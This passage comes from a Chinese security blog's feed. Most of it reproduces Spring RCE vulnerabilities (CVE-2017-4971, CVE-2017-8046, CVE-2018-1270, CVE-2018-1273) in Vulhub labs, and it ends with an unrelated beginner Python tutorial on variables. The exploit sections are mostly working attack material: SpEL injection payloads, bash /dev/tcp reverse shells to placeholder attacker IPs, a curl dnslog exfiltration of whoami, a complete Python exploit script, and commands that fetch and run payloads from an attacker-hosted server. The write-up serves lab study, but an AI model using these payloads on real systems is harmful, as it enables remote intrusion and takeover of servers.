&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后把 poc 复制给 reponse_type 传参的值，然后使用自己的 vps 监听 6666 端口&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/14.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;成功反弹 shell&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/15.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;我们也可以使用 dnslog 来返回执行命令的结果，需要使用 dns 平台&lt;/p&gt;&lt;p&gt;使用 curl 执行命令，返回给 dnslong&lt;br&gt;&lt;code&gt;curl `whoami`.gc7qj5.dnslog.cn&lt;/code&gt; 对其进行 base64 编码后再使用 poc 脚本生成代码&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/16.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;然后把 poc 复制给 reponse_type 传参的值，此时查看 dnslog 的结果&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/17.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;spring-webflow-远程代码执行漏洞cve-2017-4971&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-webflow-远程代码执行漏洞cve-2017-4971&#34;&gt;#&lt;/a&gt; Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）&lt;/h2&gt;&lt;h3 id=&#34;漏洞描述-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述-2&#34;&gt;#&lt;/a&gt; 漏洞描述：&lt;/h3&gt;&lt;p&gt;Spring WebFlow 构建于 Spring MVC 之上，允许实现 Web 应用程序的 “流程”。流程封装了一系列步骤，指导用户执行某些业务任务。　它的最佳位置是具有受控导航功能的有状态 Web 应用程序，例如购物逻辑，向表单添加确认步骤等。如果我们控制了数据绑定时的 field，构造恶意 SpEL 表达式来远程执行命令。&lt;/p&gt;&lt;h3 id=&#34;影响范围-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响范围-2&#34;&gt;#&lt;/a&gt; 影响范围：&lt;/h3&gt;&lt;p&gt;Spring WebFlow 2.4.0 - 2.4.4&lt;/p&gt;&lt;h3 id=&#34;复现过程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现过程-2&#34;&gt;#&lt;/a&gt; 复现过程：&lt;/h3&gt;&lt;p&gt;注：本次漏洞复现集合全部采用 Vulhub 环境&lt;/p&gt;&lt;p&gt;执行如下命令启动漏洞环境：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/18.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;点击 login 随便选用一个账号密码进行登录，然后访问 id 为 1 的酒店 http://your-ip:8080/hotels/1，点击预订按钮 “Book Hotel”，填写相关信息后点击 “Process”（从这一步，其实 WebFlow 就正式开始了）&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/19.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;点击 Confirm 进行抓包，抓到一个 POST 数据包，我们向其中添加一个字段（也就是反弹 shell 的 POC）：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;_(new java.lang.ProcessBuilder(&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/VPS/PORT 0&amp;gt;&amp;amp;1&amp;quot;)).start()=vulhub
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意：bash 反弹 shell 不能把 \ 给 URL 编码，否则 shell 会反弹失败&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/20.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;此时成功反弹 shell&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/21.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;spring-data-rest-远程命令执行漏洞cve-2017-8046&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-data-rest-远程命令执行漏洞cve-2017-8046&#34;&gt;#&lt;/a&gt; Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）&lt;/h2&gt;&lt;h3 id=&#34;漏洞描述-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述-3&#34;&gt;#&lt;/a&gt; 漏洞描述：&lt;/h3&gt;&lt;p&gt;Spring Data 是对数据访问的更高抽象。通过它，开发者进一步从数据层解放出来，更专注于业务逻辑。Spring Data REST 是一个构建在 Spring Data 之上，为了帮助开发者更加容易地开发 REST 风格的 Web 服务。在 REST API 的 Patch 方法中，path 的值被传入 setValue，导致执行了恶意 SpEL 表达式，触发远程命令执行漏洞。&lt;/p&gt;&lt;h3 id=&#34;影响范围-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响范围-3&#34;&gt;#&lt;/a&gt; 影响范围：&lt;/h3&gt;&lt;p&gt;Spring Data REST versions &amp;lt; 2.5.12, 2.6.7, 3.0 RC3&lt;br&gt;Spring Boot version &amp;lt; 2.0.0M4&lt;br&gt;Spring Data release trains &amp;lt; Kay-RC3&lt;/p&gt;&lt;h3 id=&#34;复现过程-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现过程-3&#34;&gt;#&lt;/a&gt; 复现过程：&lt;/h3&gt;&lt;p&gt;注：本次漏洞复现集合全部采用 Vulhub 环境&lt;/p&gt;&lt;p&gt;执行如下命令启动漏洞环境：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/22.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;知识点：&lt;br&gt;Get: 从服务器端获取数据，请求 body 在地址栏上&lt;br&gt;Post: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据要从新创建&lt;br&gt;Put: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据更新（全部更新）&lt;br&gt;Patch: 向服务器端提交数据，请求数据在报文 body 里发送一个修改数据的请求，需求数据更新（部分更新）&lt;br&gt;Delete: 向服务器端提交数据，请求数据在报文 body 里发送一个删除数据的请求&lt;/p&gt;&lt;p&gt;抓包修改 OPTIONS，查看接受类型和允许的请求方法。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/23.jpg&#34; alt=&#34;spring&#34;&gt;&lt;br&gt;首先注意几点：&lt;br&gt;1.Content-Type:application/json-patch+json&lt;br&gt;2. 请求数据必须是 json 数组&lt;br&gt;3.JSON Patch 方法提交的数据必须包含一个 path 成员，用于定位数据，同时还必须包含 op 成员，可选值如下：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;op	                含义
add	               添加数据
remove	            删除
replace	            修改
move	            移动
copy	            拷贝
test	       测试给定数据与指定位置数据是否相等
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问 http://your-ip:8080/customers/1，看到一个资源。我们使用 PATCH 请求来修改之：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;[{ &amp;quot;op&amp;quot;: &amp;quot;replace&amp;quot;, &amp;quot;path&amp;quot;: &amp;quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname&amp;quot;, &amp;quot;value&amp;quot;: &amp;quot;vulhub&amp;quot; }]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先将 POC 使用工具进行转义，在使用脚本将转义后的 POC 用脚本转换成十进制&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/24.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = b&#39;要执行的命令&#39;
bytecode = &#39;,&#39;.join(str(i) for i in list(payload))
print(bytecode)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将转换成的十进制带入 byte 中&lt;/p&gt;&lt;pre&gt;&lt;code&gt;[{ &amp;quot;op&amp;quot;: &amp;quot;replace&amp;quot;, &amp;quot;path&amp;quot;: &amp;quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,65,117,77,84,65,49,76,122,89,50,78,106,89,103,77,68,52,109,77,81,61,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname&amp;quot;, &amp;quot;value&amp;quot;: &amp;quot;vulhub&amp;quot; }]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/25.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;此时成功反弹 shell&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/26.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;spring-messaging-远程命令执行漏洞cve-2018-1270&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-messaging-远程命令执行漏洞cve-2018-1270&#34;&gt;#&lt;/a&gt; Spring Messaging 远程命令执行漏洞（CVE-2018-1270）&lt;/h2&gt;&lt;h3 id=&#34;漏洞描述-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述-4&#34;&gt;#&lt;/a&gt; 漏洞描述：&lt;/h3&gt;&lt;p&gt;spring messaging 为 spring 框架提供消息支持，其上层协议是 STOMP，底层通信基于 SockJS，用 STOMP 协议将数据组合成一个文本流，简单来说用 sockjs 协议发送文本流，sockjs 会选择一个合适的通道：websocket (NEW) 或 ajax (OLD) 进与后端通信。由于 selector 用 SpEL 表达式编写，并使用 StandardEvaluationContext 解析 (权限太大)，造成命令执行漏洞。&lt;/p&gt;&lt;h3 id=&#34;影响范围-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响范围-4&#34;&gt;#&lt;/a&gt; 影响范围：&lt;/h3&gt;&lt;p&gt;Spring Framework 5.0 -5.0.4&lt;br&gt;Spring Framework 4.3 - 4.3.14&lt;/p&gt;&lt;h3 id=&#34;复现过程-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现过程-4&#34;&gt;#&lt;/a&gt; 复现过程：&lt;/h3&gt;&lt;p&gt;注：本次漏洞复现集合全部采用 Vulhub 环境&lt;/p&gt;&lt;p&gt;执行如下命令启动漏洞环境：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/28.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;网上大部分文章都说 spring messaging 是基于 websocket 通信，其实不然。spring messaging 是基于 sockjs（可以理解为一个通信协议），而 sockjs 适配多种浏览器：现代浏览器中使用 websocket 通信，老式浏览器中使用 ajax 通信。&lt;/p&gt;&lt;p&gt;连接后端服务器的流程，可以理解为：&lt;/p&gt;&lt;p&gt;用 STOMP 协议将数据组合成一个文本流&lt;br&gt;用 sockjs 协议发送文本流，sockjs 会选择一个合适的通道：websocket 或 xhr (http)，与后端通信&lt;br&gt;所以我们可以使用 http 来复现漏洞，称之为 “降维打击”。&lt;/p&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1QT0NleHBsb2l0LXBmMnB5cHEyYjEyMGFucWdoODlkY2ZzOTk2ZHcxdHBtcTU0ai5weQ==&#34;&gt;我编写了一个简单的 POC 脚本 exploit.py&lt;/span&gt;（需要用 python3.6 执行），因为该漏洞是订阅的时候插入 SpEL 表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：&lt;/p&gt;&lt;p&gt;基础地址，在 vulhub 中为 http://your-ip:8080/gs-guide-websocket&lt;br&gt;待执行的 SpEL 表达式，如 T (java.lang.Runtime).getRuntime ().exec (&#39;touch /tmp/success&#39;)&lt;br&gt;某一个订阅的地址，如 vulhub 中为：/topic/greetings&lt;br&gt;如何触发这个订阅，即如何让后端向这个订阅发送消息。在 vulhub 中，我们向 /app/hello 发送一个包含 name 的 json，即可触发这个事件。当然在实战中就不同了，所以这个 poc 并不具有通用性。&lt;br&gt;根据你自己的需求修改 POC。如果是 vulhub 环境，你只需修改 1 中的 url 即可。&lt;br&gt;执行：&lt;/p&gt;&lt;p&gt;直接上 EXP, 注意使用的时候修改监听 IP 和靶机地址&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json
 
logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return &#39;&#39;.join(random.choice(letters) for c in range(length))
 
 
class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f&#39;{url}/{random.randint(0, 1000)}/{random_str(8)}&#39;
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            &#39;Referer&#39;: url,
            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#39;
        }
        self.t = int(time.time()*1000)
 
    def run(self):
        url = f&#39;{self.base}/htmlfile?c=_jp.vulhub&#39;
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
     
    def send(self, command, headers, body=&#39;&#39;):
        data = [command.upper(), &#39;\n&#39;]
 
        data.append(&#39;\n&#39;.join([f&#39;{k}:{v}&#39; for k, v in headers.items()]))
         
        data.append(&#39;\n\n&#39;)
        data.append(body)
        data.append(&#39;\x00&#39;)
        data = json.dumps([&#39;&#39;.join(data)])
 
        response = self.session.post(f&#39;{self.base}/xhr_send?t={self.t}&#39;, data=data)
        if response.status_code != 204:
            logging.info(f&amp;quot;send &#39;{command}&#39; data error.&amp;quot;)
        else:
            logging.info(f&amp;quot;send &#39;{command}&#39; data success.&amp;quot;)
 
    def __del__(self):
        self.session.close()
 
 
sockjs = SockJS(&#39;http://你的靶机IP:8080/gs-guide-websocket&#39;)
sockjs.start()
time.sleep(1)
 
sockjs.send(&#39;connect&#39;, {
    &#39;accept-version&#39;: &#39;1.1,1.0&#39;,
    &#39;heart-beat&#39;: &#39;10000,10000&#39;
})
sockjs.send(&#39;subscribe&#39;, {
    &#39;selector&#39;: &#39;T(java.lang.Runtime).getRuntime().exec(new String[]{&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;exec 5&amp;lt;&amp;gt;/dev/tcp/你的kaliIP/kali监听端口;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;quot;})&#39;,
    &#39;id&#39;: &#39;sub-0&#39;,
    &#39;destination&#39;: &#39;/topic/greetings&#39;
})
 
data = json.dumps({&#39;name&#39;: &#39;vulhub&#39;})
sockjs.send(&#39;send&#39;, {
    &#39;content-length&#39;: len(data),
    &#39;destination&#39;: &#39;/app/hello&#39;
}, data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时我们运行脚本，shell 反弹成功&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/27.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;spring-data-commons-远程命令执行漏洞cve-2018-1273&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-data-commons-远程命令执行漏洞cve-2018-1273&#34;&gt;#&lt;/a&gt; Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）&lt;/h2&gt;&lt;h3 id=&#34;漏洞描述-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述-5&#34;&gt;#&lt;/a&gt; 漏洞描述：&lt;/h3&gt;&lt;p&gt;Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons 有一个重要概念：Spring Data Repository 抽象。使用 Spring Data Repository 可以极大地减少数据访问层的代码。当用户在项目中利用了 Spring-data 的相关 web 特性对用户的输入参数进行自动匹配的时候，会将用户提交的 form 表单的 key 值作为 SpEL 表达式进行注入，攻击者可以注入恶意 SpEL 表达式以执行任意命令。&lt;/p&gt;&lt;h3 id=&#34;影响范围-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#影响范围-5&#34;&gt;#&lt;/a&gt; 影响范围：&lt;/h3&gt;&lt;p&gt;Spring Data Commons 1.13 - 1.13.10&lt;br&gt;Spring Data Commons 2.0 - 2.0.5&lt;/p&gt;&lt;h3 id=&#34;复现过程-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现过程-5&#34;&gt;#&lt;/a&gt; 复现过程：&lt;/h3&gt;&lt;p&gt;注：本次漏洞复现集合全部采用 Vulhub 环境&lt;/p&gt;&lt;p&gt;执行如下命令启动漏洞环境：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动完成后，访问 http://your-ip:8080 / 即可看到 web 页面。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/29.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;注册一个用户进行抓包，username 处构造 payload&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /users?page=&amp;amp;size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&amp;amp;size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName(&amp;quot;java.lang.Runtime&amp;quot;).getRuntime().exec(&amp;quot;touch /tmp/success&amp;quot;)]=&amp;amp;password=123456&amp;amp;repeatedPassword=123456
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 docker-compose exec -it spring bash 可以进入到容器中，可以看到 /tmp 目录下已经创建出了名为 success 的文件&lt;/p&gt;&lt;p&gt;反弹 shell 的方法（针对 java 环境）：&lt;/p&gt;&lt;p&gt;首先上传一个编译后的 class 文件：&lt;br&gt;Exploit.java 文件如下：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;javascript
// 注意修改目标IP
//javac Exploit.java
public class Exploit{
    public Exploit(){
        try{
            Runtime.getRuntime().exec(&amp;quot;/bin/bash -c $@|bash 0 echo bash -i &amp;gt;&amp;amp;/dev/tcp/目标IP/2222 0&amp;gt;&amp;amp;1&amp;quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反编译一下 java 文件&lt;br&gt;&lt;code&gt;javac Exploit.java&lt;/code&gt;&lt;/p&gt;&lt;p&gt;将反编译后的文件放在攻击主机的 /root 目录下（目录可以自定义），然后在此目录下开启一个 http 服务，用于访问下载文件：&lt;br&gt;// 端口可以自行修改&lt;br&gt;&lt;code&gt;python -m http.server 9999&lt;/code&gt;&lt;/p&gt;&lt;p&gt;修改 bp 包中的内容，执行访问下载命令：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;username[#this.getClass().forName(&amp;quot;java.lang.Runtime&amp;quot;).getRuntime().exec(&amp;quot;curl  http://192.168.0.105:9999/Exploit.class&amp;quot;)]=&amp;amp;password=&amp;amp;repeatedPassword=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行下载的文件&lt;/p&gt;&lt;pre&gt;&lt;code&gt;username[#this.getClass().forName(&amp;quot;java.lang.Runtime&amp;quot;).getRuntime().exec(&amp;quot;java Exploit&amp;quot;)]=&amp;amp;password=&amp;amp;repeatedPassword=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;shell 成功反弹&lt;br&gt;&lt;img data-src=&#34;/images/spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/29.jpg&#34; alt=&#34;spring&#34;&gt;&lt;/p&gt;&lt;p&gt;反弹 shell 的方法（针对 bash 环境）：&lt;br&gt;与上面的思路大同小异，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1zaXFzcnY2ajU2cmt2ZDAyYWkwNWZwejNhOWdvdXNlLnNo&#34;&gt;只是这里执行的文件为.sh&lt;/span&gt;&lt;/p&gt;&lt;p&gt;sh 文件中的内容&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// 注意修改IP和端口
bash -i &amp;gt;&amp;amp; /dev/tcp/目标IP/2222 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;下载文件
username[#this.getClass().forName(&amp;quot;java.lang.Runtime&amp;quot;).getRuntime().exec(&amp;quot;curl -o /tmp/bash.sh http://目标IP:9999/bash.sh&amp;quot;)]=&amp;amp;password=&amp;amp;repeatedPassword=
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="CVE漏洞复现" scheme="http://avenue.cool/categories/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <category term="CVE漏洞复现" scheme="http://avenue.cool/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
        <updated>2021-02-04T07:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/</id>
        <title>1.Pyhton中变量名、输入、输出</title>
        <link rel="alternate" href="http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;变量的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#变量的定义&#34;&gt;#&lt;/a&gt; 变量的定义&lt;/h2&gt;&lt;p&gt;对于重复使用，并且经常需要修改的数据，可以定义为变量，来提高编程效率。&lt;br&gt;定义变量的语法为：变量名 = 变量值。(这里的 = 作用是赋值。)&lt;br&gt;定义变量后可以使用变量名来访问变量值。&lt;br&gt;如下示例:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# 不使用变量打印三次 &amp;quot;今天天气真好&amp;quot;,如果需要变成打印 &amp;quot;今天天气不好&amp;quot; 需要修改三行代码
print(&amp;quot;今天天气真好&amp;quot;)
print(&amp;quot;今天天气真好&amp;quot;)
print(&amp;quot;今天天气真好&amp;quot;)
# 定义一个变量表示这个字符串。如果需要修改内容，只需要修改变量对应的值即可
weather = &amp;quot;今天天气真好&amp;quot;
print(weather)  # 注意，变量名不需要使用引号包裹
print(weather)
print(weather)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#说明&#34;&gt;#&lt;/a&gt; 说明:&lt;/h2&gt;&lt;p&gt;・所谓变量名，可以理解为箱子，当需要使用变量值，就把对应的箱子拿来。&lt;br&gt;・变量即是可以变化的量，可以随时进行修改。&lt;br&gt;・程序就是用来处理数据的，而变量就是用来存储数据的。&lt;/p&gt;&lt;h3 id=&#34;变量的类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#变量的类型&#34;&gt;#&lt;/a&gt; 变量的类型&lt;/h3&gt;&lt;p&gt;程序中：在 Python 里为了应对不同的业务需求，也把数据分为不同的类型。 如下图所示：&lt;br&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h3 id=&#34;查看数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看数据类型&#34;&gt;#&lt;/a&gt; 查看数据类型&lt;/h3&gt;&lt;p&gt;・在 python 中，只要定义了一个变量，而且它有数据，那么它的类型就已经确定了，不需要咱们开发者主动的去说明它的类型，系统会自动辨别。也就是说在使用的时候 &amp;quot;变量没有类型，数据才有类型&amp;quot;。&lt;br&gt;・比如下面的示例里，我们没法预测变量 b 的类型，但是 a 的类型可以根据数据来确认。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;如果临时想要查看一个变量存储的数据类型，可以使用 type (变量的名字)，来查看变量存储的数据类型。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h2&gt;&lt;p&gt;计算机编程语言中，标识符是用户编程时使用的名字，用于给变量、常量、函数、语句块等命名，以建立起名称与使用之间的关系。&lt;/p&gt;&lt;h3 id=&#34;命名规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名规则&#34;&gt;#&lt;/a&gt; 命名规则&lt;/h3&gt;&lt;ol&gt;&lt;li&gt;标识符由字母、下划线和数字组成，且数字不能开头。&lt;/li&gt;&lt;li&gt;严格区分大小写。&lt;/li&gt;&lt;li&gt;不能使用关键字。&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&#34;命名规范&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名规范&#34;&gt;#&lt;/a&gt; 命名规范&lt;/h3&gt;&lt;p&gt;・标识符命名要做到顾名思义。&lt;br&gt;起一个有意义的名字，尽量做到看一眼就知道是什么意思 (提高代码可 读性) 比如：名字 就定义为 name , 定义学生 用 student&lt;/p&gt;&lt;pre&gt;&lt;code&gt;a = &amp;quot;zhangsan&amp;quot;  # bad
name = &amp;quot;zhangsan&amp;quot;  # good
b = 23   # bad
age = 23 # good
